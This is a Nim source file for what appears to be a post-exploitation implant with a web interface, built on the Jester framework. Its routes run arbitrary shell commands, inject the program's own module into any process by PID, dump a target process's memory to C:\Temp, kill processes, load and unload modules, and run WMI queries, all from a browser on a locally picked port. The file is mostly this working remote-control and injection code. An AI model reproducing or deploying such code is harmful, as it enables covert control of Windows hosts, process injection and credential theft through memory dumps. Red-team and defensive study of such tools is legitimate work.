import consts
import htmlgen
import jester
import psapi
import nimja/parser
import os
import shell
import environ
import strtabs
import net
import dllinject
import strutils
when defined(wmi):
  import wmi
when defined(dumper):
  import procdump

proc pickPort(minPort = 5000, tries=64): Port {.inline.} =
  ## Try to bind a port to determine if it can be used by http module. If port
  ## is used, increase port number and try again.
  ## 
  ## Race condition might happen here if port is bound in between check and 
  ## actual http server bind. 
  for i in minPort..(minPort+tries):
    var server = newSocket()
    try:
      server.bindAddr(Port(i), address = BINDADDR)
      server.listen()
      server.close()
    except OSError:
      continue
    return Port(i)

proc renderIndex(request: Request): string =
  let envInfo = getEnvInfo()
  compileTemplateFile HTTPDIR / "index.nwt"

proc renderModules(request: Request, mods: ModuleList): string =
  let envInfo = getEnvInfo()
  compileTemplateFile HTTPDIR / "modules.nwt" 

proc renderProcesses(request: Request, ps: ProcessList): string =
  let envInfo = getEnvInfo()
  compileTemplateFile HTTPDIR / "processes.nwt"

proc renderShell(request: Request, cmd = ""): string =  # TODO: separate the api request (command execution)
  let envInfo = getEnvInfo()
  var 
    output: string
    exCode: int
  if cmd != "":
    (output, exCode) = runShell(cmd)
    return output
  else:
    output = "Command output..."
  compileTemplateFile HTTPDIR / "shell.nwt"

proc renderWmi(request: Request, namespace = "", query = ""): string =
  let envInfo = getEnvInfo()
  var output = "Query output..."
  when defined(wmi):
    if request.reqMethod == HttpPost:
      output = queryWmi(namespace, query)
      # echo namespace
      # echo query
      # echo output
  compileTemplateFile HTTPDIR / "wmi.nwt"

router paraRoutes:
  get "/":
    resp renderIndex(request)
  get "/modules":
    let mods = getModulesInfo()
    resp renderModules(request, mods)
  get "/processes":
    let ps = getRunningProcesses()
    resp renderProcesses(request, ps)
  post "/modules/load":
    if loadModule(@"modname"):
      redirect "/modules"
    else:
      resp p("unable to load module.")
  delete "/modules/unload/@modName":
    if unloadModule(@"modName"):
      resp ""
    else:
      resp p("unable to unload module.")  # TODO
  get "/processes/dump/@targetPid":
    when defined(dumper):
      discard dumpToFile(@"targetPid".parseInt(), r"C:\Temp\image_" & @"targetPid" & ".dmp")  # EXPERIMENTAL
    redirect "/processes"
  get "/processes/inject/@targetPid":
    injectModule(@"targetPid".parseInt(), getMyPath())
    redirect "/processes"
  delete "/processes/kill/@targetPid":
    terminatePid(@"targetPid".parseInt())
    resp ""  # TODO: check if success.
  get "/shell":
    resp renderShell(request)
  put "/shell":
    resp renderShell(request, @"cmd")
  get "/wmi":
    resp renderWmi(request)
  post "/wmi":
    resp renderWmi(request, @"namespace", @"query")
  get "/quit":
    terminateThread()
  get "/bulma.min.css":
    resp(content=BULMACSS, contentType="text/css;charset=utf=8")
  get "/htmx.min.js":
    resp(content=HTMX, contentType="application/javascript;charset=utf-8")

proc runHttpServ*() {.stdcall.} =
  ## Serve http module.
  let port = pickPort()
  let settings = newSettings(port=port, bindAddr=BINDADDR)
  var jester = initJester(paraRoutes, settings=settings)
  jester.serve()

